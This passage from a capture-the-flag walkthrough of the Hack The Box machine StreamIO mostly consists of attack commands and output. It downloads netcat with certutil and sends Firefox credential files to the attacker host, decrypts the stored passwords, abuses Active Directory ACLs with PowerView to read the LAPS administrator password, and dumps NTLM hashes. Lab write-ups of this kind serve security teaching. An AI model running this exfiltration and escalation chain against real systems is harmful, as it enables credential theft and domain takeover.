*Evil-WinRM* PS C:\Users\nikk37\appdata\roaming\mozilla\firefox\profiles\br53rxeg.default-release> certutil -urlcache -f http://10.10.14.198/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\appdata\roaming\mozilla\firefox\profiles\br53rxeg.default-release> cmd /C "nc -nv 10.10.14.198 4444 < key4.db"
cmd.exe : (UNKNOWN) [10.10.14.198] 4444 (?) open
```

Switch to Kali, ctrl+c netcat that's received key4.db and start it again to receive the logins.json file:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# nc -nlvp 4444 > logins.json
listening on [any] 4444 ...
```

Now back to the box to send the logins file over:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\appdata\roaming\mozilla\firefox\profiles\br53rxeg.default-release> cmd /C "nc -nv 10.10.14.198 4444 < logins.json"
cmd.exe : (UNKNOWN) [10.10.14.198] 4444 (?) open
```

Finally back to Kali, ctrl+c netcat to save the file. Now let's grab [firewpwd](https://github.com/lclevy/firepwd) and run it against our files:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# wget https://github.com/lclevy/firepwd.git
--2022-06-30 22:25:04--  https://github.com/lclevy/firepwd.git
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://github.com/lclevy/firepwd [following]
--2022-06-30 22:25:04--  https://github.com/lclevy/firepwd
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘firepwd.git’
firepwd.git   100%[======================>] 179.64K  --.-KB/s    in 0.1s  
2022-06-30 22:25:05 (1.76 MB/s) - ‘firepwd.git’ saved [183956]

┌──(root㉿kali)-[~/htb/streamio]
└─# mv key4.db firepwd

┌──(root㉿kali)-[~/htb/streamio]
└─# mv logins.json firepwd

┌──(root㉿kali)-[~/htb/streamio]
└─# cd firepwd 

┌──(root㉿kali)-[~/htb/streamio/firepwd]
└─# pip install -r requirements.txt
Collecting PyCryptodome>=3.9.0
  Downloading pycryptodome-3.15.0-cp35-abi3-manylinux2010_x86_64.whl (2.3 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 12.9 MB/s eta 0:00:00
Requirement already satisfied: pyasn1>=0.4.8 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (0.4.8)
Installing collected packages: PyCryptodome
Successfully installed PyCryptodome-3.15.0

┌──(root㉿kali)-[~/htb/streamio/firepwd]
└─# python3 firepwd.py
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
<SNIP>
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

We have a new subdomain for slack with passwords decrypted for four users. Back to the box for more enumeration to find how we get to administrator.

## AD Enumeration

Looking at users group membership:

```pswershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> dsget user "CN=JDgodd,CN=Users,DC=streamIO,DC=htb" -memberof -expand
"CN=Domain Users,CN=Users,DC=streamIO,DC=htb"
"CN=Users,CN=Builtin,DC=streamIO,DC=htb"

*Evil-WinRM* PS C:\Users\nikk37\Documents> dsget user "CN=nikk37,CN=Users,DC=streamIO,DC=htb" -memberof -expand
"CN=Remote Management Users,CN=Builtin,DC=streamIO,DC=htb"
"CN=Domain Users,CN=Users,DC=streamIO,DC=htb"
"CN=Users,CN=Builtin,DC=streamIO,DC=htb"

*Evil-WinRM* PS C:\Users\nikk37\Documents> dsget user "CN=Martin Smith,CN=Users,DC=streamIO,DC=htb" -memberof -expand
"CN=Remote Management Users,CN=Builtin,DC=streamIO,DC=htb"
"CN=Administrators,CN=Builtin,DC=streamIO,DC=htb"
"CN=Domain Users,CN=Users,DC=streamIO,DC=htb"
"CN=Users,CN=Builtin,DC=streamIO,DC=htb"
```

If we look at domain groups we see an interesting one:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> net groups
Group Accounts for \\
-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*CORE STAFF
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
<SNIP>
```

The group CORE STAFF stands out, look at it's details we see nothing helpful:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> get-adgroup "core staff"
DistinguishedName : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
GroupCategory     : Security
GroupScope        : Global
Name              : CORE STAFF
ObjectClass       : group
ObjectGUID        : 113400d4-c787-4e58-91ad-92779b38ecc5
SamAccountName    : CORE STAFF
SID               : S-1-5-21-1470860369-1569627196-4264678630-1108
```

There's also no members of it. If we look at it's access control list (ACL):

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> (Get-ACL "AD:$((Get-ADgroup "core staff").distinguishedname)").access
<SNIP>
ActiveDirectoryRights : WriteOwner
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : streamIO\JDgodd
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
<SNIP>
```

Why would JDgood account have explicit permissions as WriteOwner of it?

Looking for computer in the domains we see just one:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> get-adcomputer -filter *
DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

And if we look at the ACL for the Domain Controllers OU that the DC sits in:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-ADOrganizationalUnit -Filter * | %{(Get-ACL "AD:$($_.distinguishedname)").access} 
ActiveDirectoryRights : ReadProperty, ExtendedRight
InheritanceType       : Descendents
ObjectType            : a156e052-fb12-45bc-9a00-056271040d9f
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : streamIO\CORE STAFF
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly
```

Finally another look at what software is installed:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> dir "c:\program files"
    Directory: C:\program files
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   1:35 AM                Common Files
d-----        2/22/2022   2:57 AM                iis express
d-----        3/28/2022   4:46 PM                internet explorer
d-----        2/22/2022   2:14 AM                LAPS
d-----        2/22/2022   2:52 AM                Microsoft
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft Visual Studio 10.0
<SNIP>
```

So what have we found?

We have the credentials for JDgodd, and he has permissions to alter membership of the **CORE STAFF** group. That group has permissions on the Domain Controllers OU, and [LAPS](https://techcommunity.microsoft.com/t5/itops-talk-blog/step-by-step-guide-how-to-configure-microsoft-local/ba-p/2806185) is installed on the Domain Controller in that OU.

## Bloodhound

We can also use [Bloodhound](https://github.com/BloodHoundAD/BloodHound) to find this out. I covered how to set up Neo4J and Bloodhound on the TryHackMe room [here](https://pencer.io/ctf/ctf-thm-postexploit). Assuming you've done that setup, you'll need to upload [SharpHound](https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe) to the box and run it to collect the data. Then download it like we did for the FireFox files using netcat. Finally drop that zip from SharpHound in to Bloodhound and start looking at the data.

You'll find the user ending in 1104 (that's JDgodd) owns **CORE STAFF** which has the rights to Read LAPS Password on the DC:

![streamio-bloodhound](/assets/images/2022-07-01-23-09-58.png)

If you look at the info for ReadLAPSPassword:

![streamio-lapsinfo](/assets/images/2022-07-03-22-08-30.png)

And the Abuse info shows us what to do:

![streamio-lapsexploit](/assets/images/2022-07-03-22-09-27.png)

To be able to read the LAPS password we need to be a member of **CORE STAFF**, but we can't connect via Evil-WinRM as JDgodd because he isn't in the Remote Management Users group. Instead we can use PowerView do this whilst logged in as nikk37.

## PowerView

Grab PowerView from [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), upload and import it:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\Users\nikk37\Documents\PowerView.ps1
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Users\nikk37\Documents> . ./PowerView.ps1
```

Now we can create a credential object for JDgodd:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('streamio\JDgodd', $SecPassword)
```

And use that to add him to the **CORE STAFF** group:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\JDgodd"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -identity "Core Staff" -members "streamio\JDgodd" -credential $Cred
```

Now give it a few minutes for the changes to replicated around, then you can pull the LAPS password out:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-DomainObject dc.streamio.htb -Credential $Cred -Properties "ms-mcs-AdmPwd",name

name ms-mcs-admpwd
---- -------------
DC   XgTt7YW50.0y]F
```

## Root Flag

Now we can grab the root flag by connecting as the local administrator:

```powershell
┌──(root㉿kali)-[~/htb/streamio]
└─# evil-winrm -i streamio.htb -u Administrator -p 'XgTt7YW50.0y]F'
Evil-WinRM shell v3.3
*Evil-WinRM* PS C:\Users\Administrator\Documents>

*Evil-WinRM* PS C:\Users\Administrator> type c:\users\martin\desktop\root.txt
1fa5dc25cb374ec74ca246288c26fa7f
```

Here's a few hashes via Meterpreter just for fun:

```sh
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7a98a423173ace118447a53577aa1767:::
JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::
Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::
nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::
yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::
```

That was a great box. I hope you learned something from this lengthy walkthrough. See you next time.
